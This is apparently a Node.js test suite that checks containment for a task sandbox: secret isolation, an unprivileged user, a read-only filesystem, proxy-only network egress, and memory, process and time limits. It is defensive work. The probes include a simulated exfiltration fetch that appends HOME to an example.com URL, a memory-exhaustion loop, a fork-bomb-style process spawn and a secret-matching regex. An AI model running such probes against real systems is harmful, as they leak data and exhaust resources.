#!/usr/bin/env node
// Containment checks for the task sandbox. Each check runs against a fresh container and prints
// PASS or FAIL. These are the "blast radius" claims made in the README, measured.
// Usage: node test/containment.mjs   (after scripts/setup.sh; RING_RUNTIME=runsc runs the sandboxes in gVisor)
import { mkdtemp, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { Sandbox, run } from '../runner/sandbox.mjs';
import { runTask } from '../runner/run-task.mjs';

const results = [];
const check = (name, pass, detail) => { results.push({ name, pass, detail }); console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`); };
const gone = async (name) => (await run('docker', ['ps', '-aq', '--filter', `name=^${name}$`])).stdout.trim() === '';
const runtime = process.env.RING_RUNTIME || undefined;
console.log(`runtime: ${runtime ?? 'docker default'}`);

// A secret on the host that must never reach the sandbox.
process.env.RING_FAKE_API_KEY = 'sk-should-never-leak';

const box = await Sandbox.create({ runtime });
try {
  const env = await box.exec('env');
  const leaked = env.stdout.split('\n').filter((l) => /KEY|TOKEN|SECRET|PASSWORD/i.test(l));
  check('no secrets in the sandbox environment', leaked.length === 0 && !env.stdout.includes('sk-should-never-leak'), leaked.join(', ') || 'only proxy and path variables');

  const user = await box.exec('id -u');
  check('runs as an unprivileged user', user.stdout.trim() !== '0', `uid ${user.stdout.trim()}`);

  const ro = await box.exec('touch /usr/local/bin/x');
  check('root filesystem is read-only', ro.code !== 0, ro.stderr.trim().split('\n').pop());

  const direct = await box.exec(`node -e "require('net').connect(443, '1.1.1.1').on('connect', () => process.exit(0)).on('error', () => process.exit(1)); setTimeout(() => process.exit(2), 5000)"`, { timeoutMs: 15_000 });
  check('no direct route to the internet', direct.code !== 0, direct.code === 2 ? 'connect timed out' : 'connect refused');

  const gh = await box.exec('git ls-remote https://github.com/vulinh1704/mantis HEAD', { timeoutMs: 30_000 });
  check('allowlisted host works through the proxy (github.com)', gh.code === 0, gh.code === 0 ? 'git ls-remote ok' : gh.stderr.trim().split('\n').pop());

  const other = await box.exec('git ls-remote https://gitlab.com/gitlab-org/gitlab-foss.git HEAD', { timeoutMs: 30_000 });
  check('any other host is refused by the proxy', other.code !== 0, other.stderr.trim().split('\n').pop());

  const exfil = await box.exec(`node -e "fetch('https://example.com/?k=' + process.env.HOME).then(() => process.exit(0), () => process.exit(1))"`, { timeoutMs: 20_000 });
  check('a script cannot send data out (fetch to example.com)', exfil.code !== 0);

  const mem = await box.exec(`node -e "const a = []; for (;;) a.push(Buffer.alloc(256 * 1024 * 1024, 1))"`, { timeoutMs: 60_000 });
  const oom = (await run('docker', ['inspect', '-f', '{{.State.OOMKilled}} {{.State.Running}}', box.name])).stdout.trim();
  check('memory is capped (allocation loop is killed)', mem.code === 137, `exit ${mem.code}, container ${oom.endsWith('true') ? 'still running' : 'stopped'}`);
} finally {
  await box.destroy();
}
check('container is gone after destroy()', await gone(box.name));

// Fork bomb last, in its own sandbox: once the cap is hit nothing new can start inside, so the
// process count is read from the host (the container's cgroup) instead.
const bomb = await Sandbox.create({ runtime });
try {
  const r = await bomb.exec(`i=0; while [ $i -lt 700 ]; do sleep 60 > /dev/null 2>&1 & i=$((i+1)); done; echo started $i`, { timeoutMs: 60_000 });
  const pids = Number((await run('docker', ['stats', '--no-stream', '--format', '{{.PIDs}}', bomb.name])).stdout.trim());
  const refused = /fork|resource temporarily unavailable|cannot/i.test(r.stderr);
  const capped = pids > 0 && pids <= 512 && refused;
  // Under gVisor the cap also counts the sandbox kernel's own host threads (about two per process
  // inside), so the bomb reaches it after a few hundred processes and the whole sandbox stops.
  // That still holds the bomb at the cap; the check only accepts it when fewer than 700 started.
  let stopped = false;
  if (!capped && runtime === 'runsc' && !/started 700/.test(r.stdout)) {
    for (let i = 0; i < 20 && !stopped; i++) {
      stopped = (await run('docker', ['inspect', '-f', '{{.State.Running}}', bomb.name])).stdout.trim() !== 'true';
      if (!stopped) await new Promise((ok) => setTimeout(ok, 250));
    }
  }
  check('process count is capped (fork bomb)', capped || stopped, stopped
    ? `gVisor: the sandbox stopped at the 512 cap before 700 processes started (${r.stderr.trim().split('\n').pop()})`
    : `${pids} processes after trying 700; ${refused ? 'further forks refused' : 'no refusal seen'}`);
} finally {
  await bomb.destroy();
}
check('fork-bomb container is gone too', await gone(bomb.name));

// A dev server that never answers: the task must give up within its time limit and clean up.
const dir = await mkdtemp(path.join(os.tmpdir(), 'ring-hang-'));
await writeFile(path.join(dir, 'index.html'), '<h1>never served</h1>');
const t = Date.now();
const hung = await runTask({ repo: dir, devCmd: 'sleep 999', timeoutSec: 25, runtime });
const secs = Math.round((Date.now() - t) / 1000);
check('a hanging task is stopped by the time limit', !hung.ok && /timed out/.test(hung.error ?? '') && secs <= 40, `${hung.error?.split('\n')[0]} after ${secs}s`);
check('its container is destroyed too', hung.destroyed && await gone(hung.sandbox));

const failed = results.filter((r) => !r.pass);
console.log(`\n${results.length - failed.length}/${results.length} containment checks passed`);
process.exit(failed.length ? 1 : 0);
